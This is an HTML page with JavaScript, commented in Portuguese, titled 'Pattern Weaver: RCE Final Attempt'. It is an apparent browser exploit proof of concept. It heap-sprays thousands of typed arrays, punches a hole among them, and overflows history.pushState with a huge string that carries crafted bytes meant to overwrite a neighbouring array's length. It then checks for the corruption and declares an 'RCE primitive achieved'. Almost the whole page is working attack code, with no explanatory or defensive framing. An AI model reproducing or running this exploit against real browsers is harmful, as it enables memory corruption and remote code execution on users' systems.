<!DOCTYPE html>
<html>
<head>
    <title>Pattern Weaver: RCE Final Attempt</title>
    <style>
        body { background: #000; color: #00ffff; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #008888; height: 350px; overflow-y: scroll; padding: 10px; background: #001111; color: #ccffff; margin-bottom: 15px;}
        button { 
            padding: 15px; width: 100%; font-size: 18px; font-weight: bold; 
            margin-bottom: 10px; cursor: pointer; border: 1px solid #00aaaa; 
            background: #002222; color: #00ffff; transition: 0.2s;
        }
        button:hover { background: #00ffff; color: #000; }
        .success-bg { animation: blink 1s infinite; background-color: #0f0; }
        @keyframes blink { 0% {background:#050;} 50% {background:#0f0;} 100% {background:#050;} }
    </style>
</head>
<body>
    <h1>PATTERN WEAVER</h1>
    <p>Status: Controlado (Base 709518 / Hole 168)</p>
    <p>Missão: Substituir a estrutura do objeto por um padrão falso que contenha um Tamanho Gigante.</p>

    <div id="logger" class="log">Sistema pronto.</div>

    <button onclick="runPattern([0x00, 0x00, 0x10, 0x00], 64)">1. Tecer Padrão A (64 Bytes)</button>
    <button onclick="runPattern([0x00, 0x00, 0x10, 0x00], 128)">2. Tecer Padrão A (128 Bytes - Profundo)</button>

    <button onclick="runPattern([0x00, 0x20, 0x00, 0x00], 64)">3. Tecer Padrão B (64 Bytes)</button>
    
    <button onclick="runComplexPattern()">4. Tecer Padrão C (Híbrido)</button>

    <script>
        const logger = document.getElementById('logger');
        const BASE_SIZE = 709518; 
        const HOLE_SIZE = 168;    
        const SPRAY_SIZE = 8000;
        const MAGIC_NUM = 0x41414141;

        var spray = [];

        function log(msg) {
            const d = document.createElement('div');
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logger.appendChild(d);
            logger.scrollTop = logger.scrollHeight;
        }

        // Função que cria string repetindo um array de bytes
        function createPatternString(bytes, totalBytes) {
            let res = "";
            while(res.length < totalBytes) {
                for(let b of bytes) {
                    res += String.fromCharCode(b);
                    if(res.length >= totalBytes) break;
                }
            }
            return res;
        }

        async function runPattern(patternArr, depth) {
            log("---------------------------------------");
            log(`TECENDO: [${patternArr.map(x=>x.toString(16)).join(' ')}] x ${depth} bytes`);

            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];

            // Spray
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; 
                arr[1] = i;         
                spray.push(arr);
            }

            // Buraco
            let center = 4000;
            for(let i=0; i < HOLE_SIZE; i++) {
                spray[center + i] = null;
            }

            log("Aguardando GC...");
            await new Promise(r => setTimeout(r, 1000));

            try {
                let base = new Array(BASE_SIZE + 1).join('A');
                let overflow = createPatternString(patternArr, depth);
                let payload = base + overflow;

                history.pushState({}, "pwn_" + Date.now(), payload);
                
                checkCorruption(HOLE_SIZE, center);

            } catch(e) {
                log("ERRO: " + e.message);
            }
        }
        
        async function runComplexPattern() {
            log("---------------------------------------");
            log("TECENDO: Híbrido (Zeros + Length no fundo)");
            // Limpeza
            spray = null;
            if(window.gc) window.gc();
            await new Promise(r => setTimeout(r, 200));
            spray = [];
            for(let i=0; i < SPRAY_SIZE; i++) {
                let arr = new Uint32Array(1024);
                arr[0] = MAGIC_NUM; arr[1] = i; spray.push(arr);
            }
            let center = 4000;
            for(let i=0; i < HOLE_SIZE; i++) { spray[center + i] = null; }
            await new Promise(r => setTimeout(r, 1000));

            // ESTRATÉGIA:
            // 24 bytes de ZEROS (para passar pelo header/butterfly sem crashar)
            // 4 bytes de TAMANHO (0x00, 0x00, 0x10, 0x00)
            let zeros = createPatternString([0], 24);
            let size  = createPatternString([0x00, 0x00, 0x10, 0x00], 4); 
            let tail  = createPatternString([0], 16); // Padding extra
            
            let overflow = zeros + size + tail;
            let payload = new Array(BASE_SIZE + 1).join('A') + overflow;

            history.pushState({}, "pwn_h_" + Date.now(), payload);
            checkCorruption(HOLE_SIZE, center);
        }

        function checkCorruption(holeUsed, startIdx) {
            let found = false;
            let limit = startIdx + holeUsed + 60;

            for(let i = startIdx + holeUsed; i < limit; i++) {
                if (i >= spray.length) break;
                let arr = spray[i];
                if(arr) {
                    // SUCESSO SE O LENGTH MUDAR PARA QUALQUER COISA DIFERENTE DE 1024
                    // MESMO SE VIRAR 0, É UM SINAL.
                    if(arr.length !== 1024) {
                        found = true;
                        document.body.className = "success-bg";
                        document.body.innerHTML = "";
                        
                        let h1 = document.createElement("h1");
                        h1.innerText = "RCE PRIMITIVE ACHIEVED!";
                        h1.style.fontSize = "50px"; h1.style.color = "white"; h1.style.textAlign = "center";
                        
                        let p = document.createElement("p");
                        p.innerText = `VIZINHO [${i}] | NOVO LENGTH: ${arr.length}`;
                        p.style.fontSize = "30px"; p.style.color = "white"; p.style.textAlign = "center";
                        
                        document.body.appendChild(h1);
                        document.body.appendChild(p);
                        alert(`RCE FOUND!\nIndex: ${i}\nLength: ${arr.length}`);
                        return;
                    }
                    if(arr[0] !== MAGIC_NUM) {
                        found = true;
                        log(`Index ${i}: Dados internos corrompidos (Length intacto).`);
                    }
                }
            }
            if(!found) log("Nenhuma mudança de Length visível.");
        }
    </script>
</body>
</html>
